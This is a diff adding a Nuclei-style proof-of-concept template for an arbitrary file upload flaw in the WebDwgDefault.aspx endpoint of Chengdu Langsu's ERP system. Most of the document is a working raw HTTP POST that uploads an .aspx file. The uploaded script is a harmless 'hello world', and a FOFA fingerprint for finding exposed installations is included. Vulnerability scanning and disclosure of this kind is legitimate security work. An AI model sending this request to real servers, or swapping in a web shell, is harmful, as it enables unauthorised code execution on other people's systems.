@@ -1,0 +1,44 @@
+id: poc-zv9crg8rufdh68ty
+info:
+  name: 成都朗速ERP系统存WebDwgDefault存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zv9crg8rufdh68ty'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zv9crg8rufdh68ty
+    fofa: body="/Resource/Scripts/Yw/Yw_Bootstrap.js"
+http:
+- raw:
+  - 'POST /WebDwgDefault.aspx?IsSave=true&FileName=test.asp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Requested-With: XMLHttpRequest
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Content-Type: multipart/form-data; boundary=----123
+
+    Content-Length: 331
+
+
+    ------123
+
+    Content-Disposition: form-data; name="file"; filename="1.aspx"
+
+    <%
+
+    Response.Write("hello world")
+
+    %>
+
+    ------123--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
